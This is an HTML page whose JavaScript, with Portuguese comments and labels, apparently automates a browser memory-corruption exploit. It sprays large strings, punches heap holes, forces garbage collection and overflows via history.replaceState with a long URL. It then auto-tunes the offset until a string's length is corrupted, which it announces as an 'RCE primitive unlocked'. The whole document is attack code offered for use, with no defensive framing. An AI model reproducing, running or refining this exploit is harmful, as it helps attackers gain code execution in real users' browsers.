<!DOCTYPE html>
<html>
<head>
    <title>Relentless RCE Hunter</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 3px solid white; }
        .hit { color: yellow; font-weight: bold; font-size: 1.2em; }
    </style>
</head>
<body>

    <h1>Relentless Hunter: Auto-Tune RCE</h1>
    <p>Loop contínuo: Spray -> Exploit -> Check -> Ajuste.</p>

    <button onclick="startHunter()">INICIAR CAÇADA</button>
    <button onclick="stopHunter()" style="border-color:red; color:red">PARAR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Começamos onde sabemos que funciona (DADOS)
        const START_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração VENCEDORA (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];
        var isRunning = false;
        var currentOffset = START_OFFSET;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stopHunter() { isRunning = false; log("Parando..."); }

        async function startHunter() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando caçada automática...");

            let attempt = 0;
            
            while(isRunning) {
                attempt++;
                
                // Limpeza agressiva a cada ciclo
                victims = [];
                await forceGC();
                await new Promise(r => setTimeout(r, 50));

                try {
                    // 1. SPRAY (Recriando o ambiente)
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    // Aumentamos um pouco a quantidade para melhorar a chance de colisão
                    for(let i=0; i<100; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 2. BURACOS
                    for(let i=0; i<100; i+=2) victims[i] = null;
                    await forceGC();

                    // 3. EXPLOIT
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.replaceState({}, "hunt", "/" + buffer);

                    // 4. CHECAGEM
                    let status = checkResult();

                    if (status === "RCE") {
                        isRunning = false;
                        return;
                    }
                    
                    if (status === "DATA") {
                        log(`[${attempt}] Atingiu DADOS em ${currentOffset}. Recuando 4 bytes...`, 'hit');
                        // Se acertamos dados, estamos perto! Recuamos o tiro na próxima.
                        currentOffset -= 4;
                    } else {
                        // Se não acertou nada, resetamos o offset para o padrão seguro
                        // ou mantemos se já estivemos perto? Vamos resetar para garantir o "Hit" primeiro.
                        if(attempt % 5 === 0) {
                            // A cada 5 falhas, volta pro offset original para recalibrar
                            if(currentOffset !== START_OFFSET) {
                                log(`Recalibrando offset para ${START_OFFSET}...`);
                                currentOffset = START_OFFSET;
                            } else {
                                log(`[${attempt}] Nada atingido. Tentando de novo...`);
                            }
                        }
                    }

                } catch(e) {
                    log("Erro: " + e.message);
                    // Se der erro de memória, pausa longa
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
        }

        function checkResult() {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO ABSOLUTO (RCE)
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length Corrompido! Offset: ${currentOffset}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        return "RCE";
                    }

                    // SUCESSO PARCIAL (DADOS)
                    if (msg.charCodeAt(0) === 1) {
                        return "DATA";
                    }
                } catch(e) {}
            }
            return "FAIL";
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 200));
        }
    </script>
</body>
</html>
